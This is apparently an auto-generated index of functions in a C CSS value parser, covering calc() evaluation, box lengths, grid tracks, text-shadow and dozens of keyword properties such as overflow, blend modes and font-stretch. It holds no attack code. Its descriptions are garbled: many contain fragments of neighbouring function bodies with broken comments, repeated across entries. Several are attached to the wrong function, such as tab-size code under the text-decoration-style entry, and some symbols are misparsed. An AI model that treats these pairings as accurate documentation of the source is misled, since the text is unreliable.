- `expand_grid_template_cols` (line 696) `static int expand_grid_template_cols(const char *val, css_decl *dst, int cap)` - *grid-template-columns: track count PLUS the first CSS_GRID_TRACKS_MAX track sizes, emitted in lock-step (P_GRIDCOLS + P_GRID_TRACK0..7; unsized slots emit 0 = auto so a higher-tier declaration fully resets a lower-tier one). * none/url()/malformed drop the declaration, exactly like interp_gridcols.*
- `calc_skip_ws` (line 734) `static void calc_skip_ws(calc_parser *p)`
- `calc_match_fn` (line 742) `static int calc_match_fn(calc_parser *p, const char *name)` - *Max arguments of one min()/max() call (clamp() takes exactly three). More fail * the declaration (anti-DoS; the whole value already fits one CSS_TOK_MAX token). #define CSS_MATHFN_MAX_ARGS 8 typedef struct calc_val { double px; int is_length; } calc_val; typedef struct calc_parser { const char *s; size_t n, i; } calc_parser; static void calc_skip_ws(calc_parser *p) { while (p->i < p->n && (p->s[p->i] == ' ' || p->s[p->i] == '\t')) ++p->i; } static int calc_expr(calc_parser *p, calc_val *out, int depth); /* Consumes "name(" (case-insensitive) at the cursor; 0 leaves the cursor put.*
- `calc_mathfn` (line 757) `static int calc_mathfn(calc_parser *p, calc_val *out, int depth, int kind)` - *min()/max()/clamp() (2026-07-10): comma-separated full expressions, every argument the same shape (all lengths or all bare numbers, like +/-). clamp(lo, mid, hi) is max(lo, min(mid, hi)) per CSS and takes exactly three arguments; min/max take 1..CSS_MATHFN_MAX_ARGS. Depth-bounded with the parens. kind: 0 * min, 1 max, 2 clamp.*
- `calc_term` (line 841) `static int calc_term(calc_parser *p, calc_val *out, int depth)` - *} if (p->i + 3 <= p->n && csel_lower_ch(p->s[p->i]) == 'r' && csel_lower_ch(p->s[p->i + 1]) == 'e' && csel_lower_ch(p->s[p->i + 2]) == 'm') { out->px = num * 16.0; out->is_length = 1; p->i += 3; return 1; } if (p->i + 2 <= p->n && csel_lower_ch(p->s[p->i]) == 'e' && csel_lower_ch(p->s[p->i + 1]) == 'm') { out->px = num * 16.0; out->is_length = 1; p->i += 2; return 1; } out->px = num;                      /* a bare number: length only if exactly 0 out->is_length = (num == 0.0); return 1; } /* '*' and '/' bind tighter than '+'/'-'.*
- `calc_expr` (line 860) `static int calc_expr(calc_parser *p, calc_val *out, int depth)`
- `calc_eval` (line 878) `static int calc_eval(const char *v, size_t vlen, double *out_px)` - *Evaluates the inside of a calc(...) (v[0,vlen), the "calc(" prefix and matching ")" already stripped by the caller). Fails closed on any leftover/unparsed input, * mismatched parens, a dimensionless result, or a dimensional error.*
- `calc_unwrap` (line 891) `static int calc_unwrap(const char *s, size_t *inner_start, size_t *inner_len)` - *True if s (already trimmed) is a "calc(...)" call spanning the whole string (case-insensitive keyword, balanced trailing paren); on success the argument * span is written to *inner_start / *inner_len.*
- `interp_len` (line 908) `static int interp_len(const char *v, int allow_auto, int *out)` - *Parses one box-model length. Accepts "Npx", a bare "0", "Nem"/"Nrem" (x16 px, the engine's base font), "calc(...)" over the same units (+, -, *, /, parens; see calc_eval), and (when allow_auto) "auto". Rejects %/viewport units and bare non-zero numbers outside calc() (fail closed: they need a containing block the parser does not have). Returns 1 with *out = CSS_LEN_AUTO or a signed px clamped * to [-CSS_LEN_MAX, CSS_LEN_MAX]; 0 if unsupported.*
- `emit_len` (line 966) `static int emit_len(css_decl *dst, int cap, int slot, const char *val,
                    int al...` - *Emits one box length declaration for slot into dst (cap permitting). A negative value is rejected unless allow_neg (margins allow it; padding/width do not). * Returns 1 on success, 0 if the value is unsupported or does not fit.*
- `emit_pct` (line 980) `static int emit_pct(css_decl *dst, int cap, int slot, const char *val)` - *Emits a symbolic percentage width for slot (Hito 32): "<num>%" with num > 0, carried as per-mille (99.8% -> 998) and saturating at 1000% (10000). The parser has no containing block, so the value stays symbolic until layout resolves it * (bx_width_cap). Junk or a non-positive number fails closed (returns 0).*
- `interp_len` (line 1005) `* this file that might hand a token to interp_len (transitively: margin/padding/
 * inset, flex-b...`
- `expand_box2` (line 1061) `static int expand_box2(const char *val, int slot_start, int slot_end,
                       int ...` - *Expands a two-slot logical shorthand (margin-inline / padding-block / inset-inline: one value sets both sides, two set start then end; 2026-07-10). * Fail closed on zero, more than two, or any uninterpretable token.*
- `family_of` (line 1084) `static int family_of(const char *name)` - *Maps one font-family name (a generic keyword or a common family) to a generic css_font_family bucket; -1 if unrecognised. Case-insensitive; multi-word names * (e.g. "times new roman") are compared whole.*
- `interp_fontfamily` (line 1109) `static int interp_fontfamily(const char *v)` - *font-family: the first recognised name in the comma-separated stack wins (its * generic bucket). Quotes are stripped. url() defensively dropped. -1 if none known.*
- `interp_texttransform` (line 1130) `static int interp_texttransform(const char *v)`
- `interp_valign` (line 1152) `static int interp_valign(const char *v)`
- `interp_whitespace` (line 1159) `static int interp_whitespace(const char *v)`
- `interp_tabsize` (line 1173) `static int interp_tabsize(const char *v)` - *break-spaces preserves whitespace and wraps; this engine only models the * wrap/keep distinction, so it collapses to pre-wrap (2026-07-10). if (csel_ci_eq(v, "break-spaces")) return CSS_WS_PRE_WRAP; return -1; } /* tab-size: a non-negative integer (number of spaces). -1 if unsupported.*
- `interp_textdeco_style` (line 1184) `static int interp_textdeco_style(const char *v)` - *} /* tab-size: a non-negative integer (number of spaces). -1 if unsupported. static int interp_tabsize(const char *v) { double num; const char *end; if (!parse_num(v, &num, &end)) return -1; while (*end == ' ' || *end == '\t') ++end; if (*end != '\0') return -1;  /* units/lengths dropped; only bare number int n = round_clamp(num, 0, 64); return (n > 0) ? n : -1;  /* 0 or unparseable -> unset } /* text-decoration-style: solid/wavy/dotted/dashed/double. -1 if unknown.*
- `interp_textdeco_thickness` (line 1195) `static int interp_textdeco_thickness(const char *v)` - *text-decoration-thickness: `from-font` (keyword -> 0), or a non-negative length * (px -> px, em/rem x16). -1 if unsupported (negative, %, etc -> dropped).*
- `interp_aspect_ratio` (line 1207) `static int interp_aspect_ratio(const char *v, int *num, int *den)` - *aspect-ratio: `auto`, a `<ratio>` such as `16/9` or `1.5`, or `auto <ratio>` (auto fallback). Stores both numerator and denominator x1000 (for sub-integer ratios like 1.5 -> 1500/1000). Returns 1 with *num and *den set, 0 if unsupported. A bare number 1.5 is stored as 1500/1000; 16/9 as 16000/9000; * auto / unparseable -> 0 (unset).*
- `interp_direction` (line 1240) `static int interp_direction(const char *v)` - *num = round_clamp(nv * 1000.0, 1, CSS_LEN_MAX); den = round_clamp(dv * 1000.0, 1, CSS_LEN_MAX); return 1; } /* Bare number: treat as w/h = N/1 double nv; const char *ne; if (!parse_num(buf, &nv, &ne) || *ne != '\0' || nv <= 0.0) return 1; num = round_clamp(nv * 1000.0, 1, CSS_LEN_MAX); den = 1000; return 1; } /* direction: ltr/rtl. -1 if unknown.*
- `liststyle_kw` (line 1245) `static int liststyle_kw(const char *t)`
- `interp_liststyle` (line 1261) `static int interp_liststyle(const char *v)` - *list-style-type, or the type token of the list-style shorthand: the first * recognised keyword wins. url() (a list-style-image) is dropped: never fetch.*
- `emit_spacing` (line 1290) `static int emit_spacing(css_decl *dst, int cap, int slot, const char *val)`
- `expand_shadow` (line 1304) `static int expand_shadow(const char *val, css_decl *dst, int cap)` - *text-shadow (single layer): collects up to three lengths (dx, dy, blur — blur is ignored) and an optional color, in any order. "none" emits an explicit no-shadow. Needs at least dx and dy or the whole declaration is dropped (fail closed). When no color is given it defaults to black. url() dropped: never fetch. Writes the three * contiguous P_SHADOW_* slots; offsets clamped to [-CSS_SHADOW_MAX, CSS_SHADOW_MAX].*
- `interp_position` (line 1334) `static int interp_position(const char *v)` - *} if (nlen < 2) return 0;  /* need both offsets int dx = lens[0], dy = lens[1]; if (dx > CSS_SHADOW_MAX) dx = CSS_SHADOW_MAX; if (dx < -CSS_SHADOW_MAX) dx = -CSS_SHADOW_MAX; if (dy > CSS_SHADOW_MAX) dy = CSS_SHADOW_MAX; if (dy < -CSS_SHADOW_MAX) dy = -CSS_SHADOW_MAX; dst[0].prop = P_SHADOW_DX;    dst[0].ival = dx; dst[1].prop = P_SHADOW_DY;    dst[1].ival = dy; dst[2].prop = P_SHADOW_COLOR; dst[2].ival = have_color ? color : CC_COLOR_CURRENT; return 3; } /* --- Layout / box decoration (Hito 23b-7) ---------------------------------*
- `interp_boxsizing` (line 1343) `static int interp_boxsizing(const char *v)`
- `interp_float` (line 1349) `static int interp_float(const char *v)`
- `interp_clear` (line 1356) `static int interp_clear(const char *v)`
- `interp_visibility` (line 1366) `static int interp_visibility(const char *v)` - *if (csel_ci_eq(v, "left"))  return CSS_FLOAT_LEFT; if (csel_ci_eq(v, "right")) return CSS_FLOAT_RIGHT; return -1; } static int interp_clear(const char *v) { if (csel_ci_eq(v, "none"))  return CSS_CLEAR_NONE; if (csel_ci_eq(v, "left"))  return CSS_CLEAR_LEFT; if (csel_ci_eq(v, "right")) return CSS_CLEAR_RIGHT; if (csel_ci_eq(v, "both"))  return CSS_CLEAR_BOTH; return -1; } /* --- visibility / overflow / cursor / text-overflow / word-break ----------*
- `interp_overflow` (line 1373) `static int interp_overflow(const char *v)`
- `expand_overflow` (line 1385) `static int expand_overflow(const char *val, css_decl *dst, int cap)` - *`overflow: X` sets both overflow-x and overflow-y to the same value. The two-token * per-axis form (`overflow: hidden visible`) is out of scope -- use the longhands.*
- `interp_cursor` (line 1392) `static int interp_cursor(const char *v)`
- `interp_text_overflow` (line 1408) `static int interp_text_overflow(const char *v)`
- `interp_word_break` (line 1414) `static int interp_word_break(const char *v)`
- `interp_overflow_wrap` (line 1421) `static int interp_overflow_wrap(const char *v)`
- `interp_border_collapse` (line 1430) `static int interp_border_collapse(const char *v)` - *if (csel_ci_eq(v, "normal"))    return CSS_WB_NORMAL; if (csel_ci_eq(v, "break-all")) return CSS_WB_BREAK; if (csel_ci_eq(v, "keep-all"))  return CSS_WB_NORMAL; /* CJK line-breaking not modeled return -1; } static int interp_overflow_wrap(const char *v) { if (csel_ci_eq(v, "normal"))     return CSS_WB_NORMAL; if (csel_ci_eq(v, "break-word")) return CSS_WB_BREAK; if (csel_ci_eq(v, "anywhere"))   return CSS_WB_BREAK; return -1; } /* border-collapse: collapse/separate. -1 if unknown.*
- `number` (line 1439) `* number (no unit) as px (common in shorthand context like "10 5"). */
static int interp_border_s...`
- `interp_empty_cells` (line 1464) `static int interp_empty_cells(const char *v)` - *if (interp_len(tok, 0, &px) && px >= 0) { if (px > CSS_BORDER_SPACING_MAX) px = CSS_BORDER_SPACING_MAX; return px; } double num; const char *end; if (parse_num(tok, &num, &end) && *end == '\0' && num >= 0.0) { px = round_clamp(num, 0, CSS_BORDER_SPACING_MAX); return px; } return -1; } /* empty-cells: show/hide. -1 unknown.*
- `interp_caption_side` (line 1471) `static int interp_caption_side(const char *v)` - *px = round_clamp(num, 0, CSS_BORDER_SPACING_MAX); return px; } return -1; } /* empty-cells: show/hide. -1 unknown. static int interp_empty_cells(const char *v) { if (csel_ci_eq(v, "show")) return CSS_EC_SHOW; if (csel_ci_eq(v, "hide")) return CSS_EC_HIDE; return -1; } /* caption-side: top/bottom. -1 unknown.*
- `interp_table_layout` (line 1478) `static int interp_table_layout(const char *v)` - *static int interp_empty_cells(const char *v) { if (csel_ci_eq(v, "show")) return CSS_EC_SHOW; if (csel_ci_eq(v, "hide")) return CSS_EC_HIDE; return -1; } /* caption-side: top/bottom. -1 unknown. static int interp_caption_side(const char *v) { if (csel_ci_eq(v, "top"))    return CSS_CS_TOP; if (csel_ci_eq(v, "bottom")) return CSS_CS_BOTTOM; return -1; } /* table-layout: auto/fixed. -1 unknown.*
- `interp_font_variant` (line 1485) `static int interp_font_variant(const char *v)` - *static int interp_caption_side(const char *v) { if (csel_ci_eq(v, "top"))    return CSS_CS_TOP; if (csel_ci_eq(v, "bottom")) return CSS_CS_BOTTOM; return -1; } /* table-layout: auto/fixed. -1 unknown. static int interp_table_layout(const char *v) { if (csel_ci_eq(v, "auto"))  return CSS_TL_AUTO; if (csel_ci_eq(v, "fixed")) return CSS_TL_FIXED; return -1; } /* font-variant (subset: only small-caps). normal/small-caps. -1 unknown.*
- `interp_hyphens` (line 1493) `static int interp_hyphens(const char *v)` - *if (csel_ci_eq(v, "auto"))  return CSS_TL_AUTO; if (csel_ci_eq(v, "fixed")) return CSS_TL_FIXED; return -1; } /* font-variant (subset: only small-caps). normal/small-caps. -1 unknown. static int interp_font_variant(const char *v) { if (csel_ci_eq(v, "normal"))     return CSS_FV_NORMAL; if (csel_ci_eq(v, "small-caps")) return CSS_FV_SMALL_CAPS; /* all-small-caps, petite-caps, etc: out of scope, fail closed return -1; } /* hyphens: none/manual/auto. -1 unknown.*
- `interp_user_select` (line 1501) `static int interp_user_select(const char *v)` - *if (csel_ci_eq(v, "small-caps")) return CSS_FV_SMALL_CAPS; /* all-small-caps, petite-caps, etc: out of scope, fail closed return -1; } /* hyphens: none/manual/auto. -1 unknown. static int interp_hyphens(const char *v) { if (csel_ci_eq(v, "none"))   return CSS_HY_NONE; if (csel_ci_eq(v, "manual")) return CSS_HY_MANUAL; if (csel_ci_eq(v, "auto"))   return CSS_HY_AUTO; return -1; } /* user-select: none/text/all/auto. -1 unknown.*
- `interp_caret_color` (line 1510) `static int interp_caret_color(const char *v)` - *if (csel_ci_eq(v, "auto"))   return CSS_HY_AUTO; return -1; } /* user-select: none/text/all/auto. -1 unknown. static int interp_user_select(const char *v) { if (csel_ci_eq(v, "none")) return CSS_US_NONE; if (csel_ci_eq(v, "text")) return CSS_US_TEXT; if (csel_ci_eq(v, "all"))  return CSS_US_ALL; if (csel_ci_eq(v, "auto")) return CSS_US_AUTO; return -1; } /* caret-color: auto -> CSS_LEN_AUTO sentinel; color -> 0xRRGGBB; -1 unset.*
- `interp_appearance` (line 1516) `static int interp_appearance(const char *v)` - *if (csel_ci_eq(v, "none")) return CSS_US_NONE; if (csel_ci_eq(v, "text")) return CSS_US_TEXT; if (csel_ci_eq(v, "all"))  return CSS_US_ALL; if (csel_ci_eq(v, "auto")) return CSS_US_AUTO; return -1; } /* caret-color: auto -> CSS_LEN_AUTO sentinel; color -> 0xRRGGBB; -1 unset. static int interp_caret_color(const char *v) { if (csel_ci_eq(v, "auto")) return CSS_LEN_AUTO; return parse_color(v); } /* appearance: auto/none. -1 unknown.*
- `interp_pointer_events` (line 1523) `static int interp_pointer_events(const char *v)` - */* caret-color: auto -> CSS_LEN_AUTO sentinel; color -> 0xRRGGBB; -1 unset. static int interp_caret_color(const char *v) { if (csel_ci_eq(v, "auto")) return CSS_LEN_AUTO; return parse_color(v); } /* appearance: auto/none. -1 unknown. static int interp_appearance(const char *v) { if (csel_ci_eq(v, "auto")) return CSS_AP_AUTO; if (csel_ci_eq(v, "none")) return CSS_AP_NONE; return -1; } /* pointer-events: auto/none. -1 unknown.*
- `interp_bg_repeat` (line 1530) `static int interp_bg_repeat(const char *v)` - *static int interp_appearance(const char *v) { if (csel_ci_eq(v, "auto")) return CSS_AP_AUTO; if (csel_ci_eq(v, "none")) return CSS_AP_NONE; return -1; } /* pointer-events: auto/none. -1 unknown. static int interp_pointer_events(const char *v) { if (csel_ci_eq(v, "auto")) return CSS_PE_AUTO; if (csel_ci_eq(v, "none")) return CSS_PE_NONE; return -1; } /* background-repeat: repeat/no-repeat/repeat-x/repeat-y/space/round. -1 unknown.*
- `interp_bg_size` (line 1540) `static int interp_bg_size(const char *v)` - *return -1; } /* background-repeat: repeat/no-repeat/repeat-x/repeat-y/space/round. -1 unknown. static int interp_bg_repeat(const char *v) { if (csel_ci_eq(v, "repeat"))    return CSS_BGR_REPEAT; if (csel_ci_eq(v, "no-repeat")) return CSS_BGR_NO_REPEAT; if (csel_ci_eq(v, "repeat-x"))  return CSS_BGR_REPEAT_X; if (csel_ci_eq(v, "repeat-y"))  return CSS_BGR_REPEAT_Y; if (csel_ci_eq(v, "space"))     return CSS_BGR_SPACE; if (csel_ci_eq(v, "round"))     return CSS_BGR_ROUND; return -1; } /* background-size: auto/cover/contain. -1 unknown (lengths dropped).*
- `interp_bg_clip` (line 1547) `static int interp_bg_clip(const char *v)` - *if (csel_ci_eq(v, "repeat-x"))  return CSS_BGR_REPEAT_X; if (csel_ci_eq(v, "repeat-y"))  return CSS_BGR_REPEAT_Y; if (csel_ci_eq(v, "space"))     return CSS_BGR_SPACE; if (csel_ci_eq(v, "round"))     return CSS_BGR_ROUND; return -1; } /* background-size: auto/cover/contain. -1 unknown (lengths dropped). static int interp_bg_size(const char *v) { if (csel_ci_eq(v, "auto"))    return CSS_BGS_AUTO; if (csel_ci_eq(v, "cover"))   return CSS_BGS_COVER; if (csel_ci_eq(v, "contain")) return CSS_BGS_CONTAIN; return -1; } /* background-clip: border-box/padding-box/content-box/text. -1 unknown.*
- `interp_bg_origin` (line 1555) `static int interp_bg_origin(const char *v)` - *if (csel_ci_eq(v, "auto"))    return CSS_BGS_AUTO; if (csel_ci_eq(v, "cover"))   return CSS_BGS_COVER; if (csel_ci_eq(v, "contain")) return CSS_BGS_CONTAIN; return -1; } /* background-clip: border-box/padding-box/content-box/text. -1 unknown. static int interp_bg_clip(const char *v) { if (csel_ci_eq(v, "border-box"))   return CSS_BGC_BORDER_BOX; if (csel_ci_eq(v, "padding-box"))  return CSS_BGC_PADDING_BOX; if (csel_ci_eq(v, "content-box"))  return CSS_BGC_CONTENT_BOX; if (csel_ci_eq(v, "text"))         return CSS_BGC_TEXT; return -1; } /* background-origin: padding-box/border-box/content-box. -1 unknown.*
- `interp_bg_attachment` (line 1562) `static int interp_bg_attachment(const char *v)` - *if (csel_ci_eq(v, "border-box"))   return CSS_BGC_BORDER_BOX; if (csel_ci_eq(v, "padding-box"))  return CSS_BGC_PADDING_BOX; if (csel_ci_eq(v, "content-box"))  return CSS_BGC_CONTENT_BOX; if (csel_ci_eq(v, "text"))         return CSS_BGC_TEXT; return -1; } /* background-origin: padding-box/border-box/content-box. -1 unknown. static int interp_bg_origin(const char *v) { if (csel_ci_eq(v, "padding-box"))  return CSS_BGO_PADDING_BOX; if (csel_ci_eq(v, "border-box"))   return CSS_BGO_BORDER_BOX; if (csel_ci_eq(v, "content-box"))  return CSS_BGO_CONTENT_BOX; return -1; } /* background-attachment: scroll/fixed/local. -1 unknown.*
- `interp_isolation` (line 1569) `static int interp_isolation(const char *v)` - *static int interp_bg_origin(const char *v) { if (csel_ci_eq(v, "padding-box"))  return CSS_BGO_PADDING_BOX; if (csel_ci_eq(v, "border-box"))   return CSS_BGO_BORDER_BOX; if (csel_ci_eq(v, "content-box"))  return CSS_BGO_CONTENT_BOX; return -1; } /* background-attachment: scroll/fixed/local. -1 unknown. static int interp_bg_attachment(const char *v) { if (csel_ci_eq(v, "scroll")) return CSS_BGA_SCROLL; if (csel_ci_eq(v, "fixed"))  return CSS_BGA_FIXED; if (csel_ci_eq(v, "local"))  return CSS_BGA_LOCAL; return -1; } /* isolation: auto/isolate. -1 unknown.*
- `interp_contain` (line 1575) `static int interp_contain(const char *v)` - */* background-attachment: scroll/fixed/local. -1 unknown. static int interp_bg_attachment(const char *v) { if (csel_ci_eq(v, "scroll")) return CSS_BGA_SCROLL; if (csel_ci_eq(v, "fixed"))  return CSS_BGA_FIXED; if (csel_ci_eq(v, "local"))  return CSS_BGA_LOCAL; return -1; } /* isolation: auto/isolate. -1 unknown. static int interp_isolation(const char *v) { if (csel_ci_eq(v, "auto"))    return CSS_ISO_AUTO; if (csel_ci_eq(v, "isolate")) return CSS_ISO_ISOLATE; return -1; } /* contain: none/strict/content / space-separated size layout style paint.*
- `interp_content_visibility` (line 1596) `static int interp_content_visibility(const char *v)` - *while (*p == ' ' || *p == '\t') ++p; if (*p == '\0') break; char tok[CSS_TOK_MAX]; size_t k = 0; while (*p != '\0' && *p != ' ' && *p != '\t' && k + 1 < sizeof tok) tok[k++] = *p++; tok[k] = '\0'; if (csel_ci_eq(tok, "size"))   mask |= CSS_CONTAIN_SIZE; else if (csel_ci_eq(tok, "layout")) mask |= CSS_CONTAIN_LAYOUT; else if (csel_ci_eq(tok, "style"))  mask |= CSS_CONTAIN_STYLE; else if (csel_ci_eq(tok, "paint"))  mask |= CSS_CONTAIN_PAINT; } return mask; } /* content-visibility: visible/auto/hidden. -1 unknown.*
- `interp_image_rendering` (line 1603) `static int interp_image_rendering(const char *v)` - *else if (csel_ci_eq(tok, "layout")) mask |= CSS_CONTAIN_LAYOUT; else if (csel_ci_eq(tok, "style"))  mask |= CSS_CONTAIN_STYLE; else if (csel_ci_eq(tok, "paint"))  mask |= CSS_CONTAIN_PAINT; } return mask; } /* content-visibility: visible/auto/hidden. -1 unknown. static int interp_content_visibility(const char *v) { if (csel_ci_eq(v, "visible")) return CSS_CV_VISIBLE; if (csel_ci_eq(v, "auto"))    return CSS_CV_AUTO; if (csel_ci_eq(v, "hidden"))  return CSS_CV_HIDDEN; return -1; } /* image-rendering: auto/pixelated/crisp-edges. -1 unknown.*
- `interp_color_scheme` (line 1610) `static int interp_color_scheme(const char *v)` - *static int interp_content_visibility(const char *v) { if (csel_ci_eq(v, "visible")) return CSS_CV_VISIBLE; if (csel_ci_eq(v, "auto"))    return CSS_CV_AUTO; if (csel_ci_eq(v, "hidden"))  return CSS_CV_HIDDEN; return -1; } /* image-rendering: auto/pixelated/crisp-edges. -1 unknown. static int interp_image_rendering(const char *v) { if (csel_ci_eq(v, "auto"))        return CSS_IR_AUTO; if (csel_ci_eq(v, "pixelated"))   return CSS_IR_PIXELATED; if (csel_ci_eq(v, "crisp-edges")) return CSS_IR_CRISP_EDGES; return -1; } /* color-scheme: normal/light/dark; multi-keyword "light dark" -> first wins. -1 unknown.*
- `interp_accent_color` (line 1628) `static int interp_accent_color(const char *v)` - *const char *p = v; while (*p != '\0') { while (*p == ' ' || *p == '\t') ++p; if (*p == '\0') break; char tok[CSS_TOK_MAX]; size_t k = 0; while (*p != '\0' && *p != ' ' && *p != '\t' && k + 1 < sizeof tok) tok[k++] = *p++; tok[k] = '\0'; if (csel_ci_eq(tok, "light")) return CSS_CSH_LIGHT; if (csel_ci_eq(tok, "dark"))  return CSS_CSH_DARK; } return -1; } /* accent-color: auto -> CSS_LEN_AUTO; color -> 0xRRGGBB; -1 unknown.*
- `interp_print_color_adjust` (line 1633) `static int interp_print_color_adjust(const char *v)` - *size_t k = 0; while (*p != '\0' && *p != ' ' && *p != '\t' && k + 1 < sizeof tok) tok[k++] = *p++; tok[k] = '\0'; if (csel_ci_eq(tok, "light")) return CSS_CSH_LIGHT; if (csel_ci_eq(tok, "dark"))  return CSS_CSH_DARK; } return -1; } /* accent-color: auto -> CSS_LEN_AUTO; color -> 0xRRGGBB; -1 unknown. static int interp_accent_color(const char *v) { if (csel_ci_eq(v, "auto")) return CSS_LEN_AUTO; return parse_color(v); } /* print-color-adjust: economy/exact. -1 unknown.*
- `interp_forced_color_adjust` (line 1639) `static int interp_forced_color_adjust(const char *v)` - *return -1; } /* accent-color: auto -> CSS_LEN_AUTO; color -> 0xRRGGBB; -1 unknown. static int interp_accent_color(const char *v) { if (csel_ci_eq(v, "auto")) return CSS_LEN_AUTO; return parse_color(v); } /* print-color-adjust: economy/exact. -1 unknown. static int interp_print_color_adjust(const char *v) { if (csel_ci_eq(v, "economy")) return CSS_PCA_ECONOMY; if (csel_ci_eq(v, "exact"))   return CSS_PCA_EXACT; return -1; } /* forced-color-adjust: auto/none. -1 unknown.*
- `interp_mix_blend_mode` (line 1646) `static int interp_mix_blend_mode(const char *v)` - */* print-color-adjust: economy/exact. -1 unknown. static int interp_print_color_adjust(const char *v) { if (csel_ci_eq(v, "economy")) return CSS_PCA_ECONOMY; if (csel_ci_eq(v, "exact"))   return CSS_PCA_EXACT; return -1; } /* forced-color-adjust: auto/none. -1 unknown. static int interp_forced_color_adjust(const char *v) { if (csel_ci_eq(v, "auto")) return CSS_FCA_AUTO; if (csel_ci_eq(v, "none")) return CSS_FCA_NONE; return -1; } /* mix-blend-mode: normal/multiply/screen/… -1 unknown.*
- `interp_object_fit` (line 1664) `static int interp_object_fit(const char *v)` - *if (csel_ci_eq(v, "overlay"))      return CSS_MB_OVERLAY; if (csel_ci_eq(v, "darken"))       return CSS_MB_DARKEN; if (csel_ci_eq(v, "lighten"))      return CSS_MB_LIGHTEN; if (csel_ci_eq(v, "color-dodge"))  return CSS_MB_COLOR_DODGE; if (csel_ci_eq(v, "color-burn"))   return CSS_MB_COLOR_BURN; if (csel_ci_eq(v, "difference"))   return CSS_MB_DIFFERENCE; if (csel_ci_eq(v, "exclusion"))    return CSS_MB_EXCLUSION; if (csel_ci_eq(v, "hue"))          return CSS_MB_HUE; if (csel_ci_eq(v, "saturation"))   return CSS_MB_SATURATION; if (csel_ci_eq(v, "color"))        return CSS_MB_COLOR; if (csel_ci_eq(v, "luminosity"))   return CSS_MB_LUMINOSITY; return -1; } /* object-fit: fill/contain/cover/none/scale-down. -1 unknown.*
- `interp_list_style_pos` (line 1673) `static int interp_list_style_pos(const char *v)` - *if (csel_ci_eq(v, "color"))        return CSS_MB_COLOR; if (csel_ci_eq(v, "luminosity"))   return CSS_MB_LUMINOSITY; return -1; } /* object-fit: fill/contain/cover/none/scale-down. -1 unknown. static int interp_object_fit(const char *v) { if (csel_ci_eq(v, "fill"))        return CSS_OFI_FILL; if (csel_ci_eq(v, "contain"))     return CSS_OFI_CONTAIN; if (csel_ci_eq(v, "cover"))       return CSS_OFI_COVER; if (csel_ci_eq(v, "none"))        return CSS_OFI_NONE; if (csel_ci_eq(v, "scale-down"))  return CSS_OFI_SCALE_DOWN; return -1; } /* list-style-position: inside/outside. -1 unknown.*
- `interp_font_kerning` (line 1679) `static int interp_font_kerning(const char *v)` - *if (csel_ci_eq(v, "fill"))        return CSS_OFI_FILL; if (csel_ci_eq(v, "contain"))     return CSS_OFI_CONTAIN; if (csel_ci_eq(v, "cover"))       return CSS_OFI_COVER; if (csel_ci_eq(v, "none"))        return CSS_OFI_NONE; if (csel_ci_eq(v, "scale-down"))  return CSS_OFI_SCALE_DOWN; return -1; } /* list-style-position: inside/outside. -1 unknown. static int interp_list_style_pos(const char *v) { if (csel_ci_eq(v, "inside"))  return CSS_LP_INSIDE; if (csel_ci_eq(v, "outside")) return CSS_LP_OUTSIDE; return -1; } /* font-kerning: auto/normal/none. -1 unknown.*
- `interp_text_rendering` (line 1686) `static int interp_text_rendering(const char *v)` - */* list-style-position: inside/outside. -1 unknown. static int interp_list_style_pos(const char *v) { if (csel_ci_eq(v, "inside"))  return CSS_LP_INSIDE; if (csel_ci_eq(v, "outside")) return CSS_LP_OUTSIDE; return -1; } /* font-kerning: auto/normal/none. -1 unknown. static int interp_font_kerning(const char *v) { if (csel_ci_eq(v, "auto"))   return CSS_FK_AUTO; if (csel_ci_eq(v, "normal")) return CSS_FK_NORMAL; if (csel_ci_eq(v, "none"))   return CSS_FK_NONE; return -1; } /* text-rendering: auto/optimizeSpeed/optimizeLegibility/geometricPrecision. -1 unknown.*
- `interp_font_stretch` (line 1694) `static int interp_font_stretch(const char *v)` - *if (csel_ci_eq(v, "auto"))   return CSS_FK_AUTO; if (csel_ci_eq(v, "normal")) return CSS_FK_NORMAL; if (csel_ci_eq(v, "none"))   return CSS_FK_NONE; return -1; } /* text-rendering: auto/optimizeSpeed/optimizeLegibility/geometricPrecision. -1 unknown. static int interp_text_rendering(const char *v) { if (csel_ci_eq(v, "auto"))                return CSS_TR_AUTO; if (csel_ci_eq(v, "optimizeSpeed"))       return CSS_TR_OPTIMIZE_SPEED; if (csel_ci_eq(v, "optimizeLegibility"))  return CSS_TR_OPTIMIZE_LEGIBILITY; if (csel_ci_eq(v, "geometricPrecision"))  return CSS_TR_GEOMETRIC_PRECISION; return -1; } /* font-stretch: normal/condensed/expanded/etc. -1 unknown.*
- `interp_resize` (line 1707) `static int interp_resize(const char *v)` - */* font-stretch: normal/condensed/expanded/etc. -1 unknown. static int interp_font_stretch(const char *v) { if (csel_ci_eq(v, "normal"))             return CSS_FS_NORMAL; if (csel_ci_eq(v, "condensed"))          return CSS_FS_CONDENSED; if (csel_ci_eq(v, "expanded"))           return CSS_FS_EXPANDED; if (csel_ci_eq(v, "ultra-condensed"))    return CSS_FS_ULTRA_CONDENSED; if (csel_ci_eq(v, "extra-condensed"))    return CSS_FS_EXTRA_CONDENSED; if (csel_ci_eq(v, "semi-condensed"))     return CSS_FS_SEMI_CONDENSED; if (csel_ci_eq(v, "semi-expanded"))      return CSS_FS_SEMI_EXPANDED; if (csel_ci_eq(v, "extra-expanded"))     return CSS_FS_EXTRA_EXPANDED; if (csel_ci_eq(v, "ultra-expanded"))     return CSS_FS_ULTRA_EXPANDED; return -1; } /* resize: none/both/horizontal/vertical. -1 unknown.*
- `interp_scroll_behavior` (line 1715) `static int interp_scroll_behavior(const char *v)` - *if (csel_ci_eq(v, "semi-expanded"))      return CSS_FS_SEMI_EXPANDED; if (csel_ci_eq(v, "extra-expanded"))     return CSS_FS_EXTRA_EXPANDED; if (csel_ci_eq(v, "ultra-expanded"))     return CSS_FS_ULTRA_EXPANDED; return -1; } /* resize: none/both/horizontal/vertical. -1 unknown. static int interp_resize(const char *v) { if (csel_ci_eq(v, "none"))        return CSS_RS_NONE; if (csel_ci_eq(v, "both"))        return CSS_RS_BOTH; if (csel_ci_eq(v, "horizontal"))  return CSS_RS_HORIZONTAL; if (csel_ci_eq(v, "vertical"))    return CSS_RS_VERTICAL; return -1; } /* scroll-behavior: auto/smooth. -1 unknown.*
